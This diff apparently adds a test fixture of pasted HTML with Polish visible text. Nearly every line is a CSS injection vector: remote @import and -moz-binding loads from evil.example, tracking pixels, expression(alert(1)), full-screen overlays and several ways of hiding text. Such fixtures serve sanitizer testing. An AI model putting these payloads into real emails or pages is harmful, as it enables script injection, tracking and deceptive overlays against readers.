@@ -1,0 +1,17 @@
+<html><head><style>@import url(https://evil.example/x.css); p.ukryty {display:none} .nakladka {position:fixed; top:0; left:0} p { behavior: url(x.htc) }</style></head><body><!--StartFragment--><p>Widoczny akapit z ą i ę.</p>
+<p style="background:url(https://tracker.example/pixel.gif)">piksel śledzący</p>
+<p style="background-image: url('https://tracker.example/b.gif'); color: red">tło</p>
+<p style="width:expression(alert(1))">expression</p>
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">nakładka na całą wiadomość</div>
+<div class="nakladka">nakładka z klasy</div>
+<p style="margin-top:-500px">wciągnięte na stopkę</p>
+<span style="display:none">ukryty tekst</span>
+<p class="ukryty">ukryty z klasy</p>
+<span style="font-size:0">tekst o rozmiarze zero</span>
+<p style="color:red;-moz-binding:url(https://evil.example/x.xml#xss)">binding</p>
+<p style="color:\72 ed">ucieczka</p>
+<p style="color:red/*komentarz*/">komentarz</p>
+<p style="font-family:'Aptos';content:'podmiana'">content</p>
+<p style="opacity:0">przezroczyste</p>
+<p style="color: var(--x); font-size: calc(10px + 2px)">var i calc</p>
+<p style="mso-hide:all">ukryte w Office</p><!--EndFragment--></body></html>
